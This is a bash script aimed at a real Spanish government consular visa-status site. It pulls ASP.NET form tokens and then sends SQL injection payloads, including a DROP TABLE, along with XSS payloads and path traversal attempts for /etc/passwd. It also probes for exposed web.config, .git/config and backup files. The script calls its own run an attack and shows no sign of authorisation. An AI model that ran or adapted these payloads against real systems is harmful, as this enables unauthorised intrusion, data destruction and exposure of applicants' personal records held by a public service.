#!/bin/bash

echo "[+] Starting attack vectors against sutramiteconsular.maec.es"

# Get initial page and extract tokens
echo "[+] Getting initial page and extracting tokens..."
curl -k -s https://sutramiteconsular.maec.es/ > initial_page.html

# Extract __VIEWSTATE
VIEWSTATE=$(grep -o 'name="__VIEWSTATE" id="__VIEWSTATE" value="[^"]*"' initial_page.html | cut -d'"' -f4)
echo "[+] __VIEWSTATE: ${VIEWSTATE:0:50}..."

# Extract __EVENTVALIDATION
EVENTVALIDATION=$(grep -o 'name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="[^"]*"' initial_page.html | cut -d'"' -f4)
echo "[+] __EVENTVALIDATION: ${EVENTVALIDATION:0:50}..."

# Test SQL Injection payloads
echo "[+] Testing SQL Injection payloads..."

SQL_PAYLOADS=(
    "' OR '1'='1"
    "' OR 1=1--"
    "'; DROP TABLE users; --"
    "' UNION SELECT 1,2,3,4,5--"
    "' OR '1'='1' OR '1'='1"
    "admin'--"
    "admin'/*"
    "' OR 'x'='x"
)

for payload in "${SQL_PAYLOADS[@]}"; do
    echo "[+] Testing SQL payload: $payload"
    curl -k -s -X POST https://sutramiteconsular.maec.es/ \
        -d "__VIEWSTATE=$VIEWSTATE" \
        -d "__EVENTVALIDATION=$EVENTVALIDATION" \
        -d "infServicio=VISADO" \
        -d "txIdentificador=$payload" \
        -d "txtFechaNacimiento=1990" \
        -d "imgcaptcha=123456" \
        -d "imgVerSuTramite.x=0" \
        -d "imgVerSuTramite.y=0" \
        -o "sql_test_${RANDOM}.html"
    
    if grep -i "error\|exception\|sql" sql_test_*.html >/dev/null 2>&1; then
        echo "[!] SQL Injection possible with payload: $payload"
    fi
done

# Test XSS payloads
echo "[+] Testing XSS payloads..."

XSS_PAYLOADS=(
    "<script>alert('XSS')</script>"
    "<img src=x onerror=alert('XSS')>"
    "javascript:alert('XSS')"
    "<svg onload=alert('XSS')>"
    "'><script>alert('XSS')</script>"
)

for payload in "${XSS_PAYLOADS[@]}"; do
    echo "[+] Testing XSS payload: $payload"
    curl -k -s -X POST https://sutramiteconsular.maec.es/ \
        -d "__VIEWSTATE=$VIEWSTATE" \
        -d "__EVENTVALIDATION=$EVENTVALIDATION" \
        -d "infServicio=VISADO" \
        -d "txIdentificador=$payload" \
        -d "txtFechaNacimiento=1990" \
        -d "imgcaptcha=123456" \
        -d "imgVerSuTramite.x=0" \
        -d "imgVerSuTramite.y=0" \
        -o "xss_test_${RANDOM}.html"
done

# Test directory traversal
echo "[+] Testing directory traversal..."

TRAVERSAL_PAYLOADS=(
    "../../../etc/passwd"
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
    "..%2f..%2f..%2fetc%2fpasswd"
    "..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts"
)

for payload in "${TRAVERSAL_PAYLOADS[@]}"; do
    echo "[+] Testing traversal: $payload"
    curl -k -s "https://sutramiteconsular.maec.es/$payload" -o "traversal_test_${RANDOM}.html"
done

# Test for common vulnerabilities
echo "[+] Testing for common vulnerabilities..."

# Test for exposed files
curl -k -s https://sutramiteconsular.maec.es/web.config -o web.config_test.html
curl -k -s https://sutramiteconsular.maec.es/robots.txt -o robots_test.html
curl -k -s https://sutramiteconsular.maec.es/.git/config -o git_test.html

# Test for backup files
curl -k -s https://sutramiteconsular.maec.es/default.aspx.bak -o backup_test.html

echo "[+] Attack testing completed. Check generated files for results."